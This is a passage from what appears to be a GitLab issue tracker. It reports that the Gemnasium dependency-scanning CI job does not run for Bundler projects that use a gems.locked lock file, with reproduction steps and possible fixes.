`yarn.lock` in the remediation diff. - Make sure auto-remediation is skipped when `package.json` changes but `yarn.lock` doesn't. - Make sure this is covered by QA, using test projects. ZD: https://gitlab.zendesk.com/agent/tickets/158755 (Internal)

title: Harden security ci build job queries
Gemnasium job not triggered for gems.locked
description:
### Summary

The `gemnasium-dependency_scanning` job is not triggered for a repository containing a `gems.locked`, even though this alias for `Gemfile.lock` is supported by the Gemnasium analyzer.

This ~regression was introduced when switching to the rules syntax. See https://gitlab.com/groups/gitlab-org/-/epics/2300

See https://depfu.com/blog/2017/09/06/gemfiles-new-clothes

### Steps to reproduce

- create a Bundler project with a `gems.locked`, and no `Gemfile.lock`
- include the Dependency Scanning template in the CI configuration

### Example Project

See https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/merge_requests/1222#note_355317861

[Renaming the lock file to `gems.locked`](https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/commit/3c2d9a01e05d701e509ee7c75e1cc04c96e40e9b?merge_request_iid=1222) results in an [invalid pipeline](https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/pipelines/152869258) because the `gemnasium-dependency_scanning` job no longer exists.

### What is the current *bug* behavior?

No `gemnasium-dependency_scanning` job

### What is the expected *correct* behavior?

`gemnasium-dependency_scanning` job is triggered.

### Possible fixes

~~Fix the `rules:exists` of the job.~~ We already have rules to detect `gems.locked` in the [Dependency Scanning template](https://gitlab.com/gitlab-org/gitlab/-/blob/38332ea9ceed122b5d32428a1c0f93fe0e44c25c/lib/gitlab/ci/templates/Security/Dependency-Scanning.gitlab-ci.yml#L110), so the issue might be more complex than just a missing rule to detect that kind of files.
